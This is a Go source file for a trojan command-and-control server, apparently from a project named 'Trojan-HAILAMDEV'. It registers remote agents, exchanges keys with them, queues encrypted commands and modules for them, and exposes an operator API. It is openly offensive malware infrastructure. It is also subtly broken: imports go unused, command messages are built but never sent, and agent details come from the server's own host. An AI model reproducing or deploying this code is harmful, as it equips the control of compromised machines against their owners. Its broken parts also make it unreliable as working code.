package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/google/uuid"
	"github.com/shirou/gopsutil/v3/process"
	"github.com/spf13/viper"
)

type Config struct {
	C2 struct {
		Host             string `mapstructure:"host"`
		Port             int    `mapstructure:"port"`
		TLSCert          string `mapstructure:"tls_cert"`
		TLSKey           string `mapstructure:"tls_key"`
		HeartbeatTimeout int    `mapstructure:"heartbeat_timeout"`
		MaxAgents        int    `mapstructure:"max_agents"`
	} `mapstructure:"c2"`
	Agent struct {
		BeaconInterval  int     `mapstructure:"beacon_interval"`
		Jitter          float64 `mapstructure:"jitter"`
		MaxRetries      int     `mapstructure:"max_retries"`
		ReconnectDelay  int     `mapstructure:"reconnect_delay"`
		UserAgent       string  `mapstructure:"user_agent"`
	} `mapstructure:"agent"`
	Crypto struct {
		Algorithm          string `mapstructure:"algorithm"`
		KeyRotationInterval int   `mapstructure:"key_rotation_interval"`
		Curve              string `mapstructure:"curve"`
	} `mapstructure:"crypto"`
	Logging struct {
		Level  string `mapstructure:"level"`
		Format string `mapstructure:"format"`
		Output string `mapstructure:"output"`
	} `mapstructure:"logging"`
	Modules []string `mapstructure:"modules"`
}

type Agent struct {
	ID           string    `json:"id"`
	Hostname     string    `json:"hostname"`
	OS           string    `json:"os"`
	Arch         string    `json:"arch"`
	Username     string    `json:"username"`
	IP           string    `json:"ip"`
	FirstSeen    time.Time `json:"first_seen"`
	LastSeen     time.Time `json:"last_seen"`
	Status       string    `json:"status"`
	Modules      []string  `json:"modules"`
	EncryptionKey []byte   `json:"-"`
}

type Command struct {
	ID        string          `json:"id"`
	AgentID   string          `json:"agent_id"`
	Type      string          `json:"type"`
	Payload   json.RawMessage `json:"payload"`
	Status    string          `json:"status"`
	CreatedAt time.Time       `json:"created_at"`
	Result    json.RawMessage `json:"result,omitempty"`
}

type Server struct {
	config     *Config
	agents     map[string]*Agent
	commands   map[string]*Command
	agentsMu   sync.RWMutex
	commandsMu sync.RWMutex
	upgrader   websocket.Upgrader
	server     *http.Server
}

func loadConfig() *Config {
	viper.SetConfigName("config")
	viper.SetConfigType("yaml")
	viper.AddConfigPath("./config")
	viper.AddConfigPath("/home/hainx/Documents/Trojan-HAILAMDEV/config")
	
	if err := viper.ReadInConfig(); err != nil {
		fmt.Printf("Config error: %v\n", err)
		os.Exit(1)
	}
	
	var config Config
	if err := viper.Unmarshal(&config); err != nil {
		fmt.Printf("Unmarshal error: %v\n", err)
		os.Exit(1)
	}
	return &config
}

func generateKey() ([]byte, error) {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	return key, err
}

func encrypt(data []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(encoded string, key []byte) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func newServer(config *Config) *Server {
	return &Server{
		config: config,
		agents: make(map[string]*Agent),
		commands: make(map[string]*Command),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
	}
}

func (s *Server) registerAgent(conn *websocket.Conn) *Agent {
	hostname, _ := os.Hostname()
	agent := &Agent{
		ID:           uuid.New().String(),
		Hostname:     hostname,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		Username:     os.Getenv("USER"),
		IP:           getLocalIP(),
		FirstSeen:    time.Now(),
		LastSeen:     time.Now(),
		Status:       "active",
		Modules:      s.config.Modules,
		EncryptionKey: nil,
	}
	
	key, _ := generateKey()
	agent.EncryptionKey = key
	
	s.agentsMu.Lock()
	s.agents[agent.ID] = agent
	s.agentsMu.Unlock()
	
	return agent
}

func (s *Server) handleAgent(ws *websocket.Conn) {
	agent := s.registerAgent(ws)
	fmt.Printf("Agent connected: %s (%s)\n", agent.ID, agent.Hostname)
	
	keyMsg := map[string]string{
		"type": "key_exchange",
		"key":  base64.StdEncoding.EncodeToString(agent.EncryptionKey),
	}
	ws.WriteJSON(keyMsg)
	
	go s.heartbeatMonitor(agent.ID)
	
	for {
		_, msg, err := ws.ReadMessage()
		if err != nil {
			fmt.Printf("Agent %s disconnected: %v\n", agent.ID, err)
			s.removeAgent(agent.ID)
			break
		}
		
		decrypted, err := decrypt(string(msg), agent.EncryptionKey)
		if err != nil {
			fmt.Printf("Decrypt error: %v\n", err)
			continue
		}
		
		var response map[string]interface{}
		json.Unmarshal(decrypted, &response)
		s.handleAgentResponse(agent.ID, response)
	}
}

func (s *Server) handleAgentResponse(agentID string, response map[string]interface{}) {
	s.agentsMu.RLock()
	agent, exists := s.agents[agentID]
	s.agentsMu.RUnlock()
	
	if !exists {
		return
	}
	
	agent.LastSeen = time.Now()
	
	if cmdID, ok := response["command_id"].(string); ok {
		s.commandsMu.Lock()
		if cmd, exists := s.commands[cmdID]; exists {
			cmd.Status = "completed"
			cmd.Result, _ = json.Marshal(response["result"])
		}
		s.commandsMu.Unlock()
	}
}

func (s *Server) heartbeatMonitor(agentID string) {
	ticker := time.NewTicker(time.Duration(s.config.C2.HeartbeatTimeout) * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		s.agentsMu.RLock()
		agent, exists := s.agents[agentID]
		s.agentsMu.RUnlock()
		
		if !exists {
			return
		}
		
		if time.Since(agent.LastSeen) > time.Duration(s.config.C2.HeartbeatTimeout)*time.Second {
			fmt.Printf("Agent %s heartbeat timeout\n", agentID)
			s.removeAgent(agentID)
			return
		}
	}
}

func (s *Server) removeAgent(agentID string) {
	s.agentsMu.Lock()
	delete(s.agents, agentID)
	s.agentsMu.Unlock()
}

func (s *Server) handleC2Connection(c *gin.Context) {
	ws, err := s.upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		return
	}
	s.handleAgent(ws)
}

func (s *Server) listAgents(c *gin.Context) {
	s.agentsMu.RLock()
	defer s.agentsMu.RUnlock()
	
	agents := make([]*Agent, 0, len(s.agents))
	for _, a := range s.agents {
		a.EncryptionKey = nil
		agents = append(agents, a)
	}
	c.JSON(http.StatusOK, agents)
}

func (s *Server) sendCommand(c *gin.Context) {
	var req struct {
		AgentID string          `json:"agent_id" binding:"required"`
		Type    string          `json:"type" binding:"required"`
		Payload json.RawMessage `json:"payload"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	s.agentsMu.RLock()
	agent, exists := s.agents[req.AgentID]
	s.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	cmd := &Command{
		ID:        uuid.New().String(),
		AgentID:   req.AgentID,
		Type:      req.Type,
		Payload:   req.Payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	s.commandsMu.Lock()
	s.commands[cmd.ID] = cmd
	s.commandsMu.Unlock()
	
	encrypted, _ := encrypt(cmd.Payload, agent.EncryptionKey)
	msg := map[string]string{
		"type":       "command",
		"command_id": cmd.ID,
		"cmd_type":   cmd.Type,
		"payload":    encrypted,
	}
	
	c.JSON(http.StatusOK, gin.H{"command_id": cmd.ID, "status": "queued"})
}

func (s *Server) getCommandResult(c *gin.Context) {
	cmdID := c.Param("id")
	s.commandsMu.RLock()
	cmd, exists := s.commands[cmdID]
	s.commandsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "command not found"})
		return
	}
	c.JSON(http.StatusOK, cmd)
}

func (s *Server) runModule(c *gin.Context) {
	var req struct {
		AgentID string          `json:"agent_id" binding:"required"`
		Module  string          `json:"module" binding:"required"`
		Args    json.RawMessage `json:"args"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	s.agentsMu.RLock()
	agent, exists := s.agents[req.AgentID]
	s.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	cmd := &Command{
		ID:        uuid.New().String(),
		AgentID:   req.AgentID,
		Type:      "module",
		Payload:   req.Args,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	s.commandsMu.Lock()
	s.commands[cmd.ID] = cmd
	s.commandsMu.Unlock()
	
	encrypted, _ := encrypt(cmd.Payload, agent.EncryptionKey)
	msg := map[string]string{
		"type":       "command",
		"command_id": cmd.ID,
		"cmd_type":   "module",
		"module":     req.Module,
		"payload":    encrypted,
	}
	
	c.JSON(http.StatusOK, gin.H{"command_id": cmd.ID, "status": "queued", "module": req.Module})
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func main() {
	config := loadConfig()
	server := newServer(config)
	
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	
	r.GET("/api/agents", server.listAgents)
	r.POST("/api/command", server.sendCommand)
	r.GET("/api/command/:id", server.getCommandResult)
	r.POST("/api/module", server.runModule)
	r.GET("/agent/ws", server.handleC2Connection)
	
	addr := fmt.Sprintf("%s:%d", config.C2.Host, config.C2.Port)
	
	if config.C2.TLSCert != "" && config.C2.TLSKey != "" {
		server.server = &http.Server{
			Addr:    addr,
			Handler: r,
			TLSConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		}
		fmt.Printf("C2 Server starting on https://%s\n", addr)
		if err := server.server.ListenAndServeTLS(config.C2.TLSCert, config.C2.TLSKey); err != nil {
			fmt.Printf("Server error: %v\n", err)
		}
	} else {
		server.server = &http.Server{
			Addr:    addr,
			Handler: r,
		}
		fmt.Printf("C2 Server starting on http://%s\n", addr)
		if err := server.server.ListenAndServe(); err != nil {
			fmt.Printf("Server error: %v\n", err)
		}
	}
}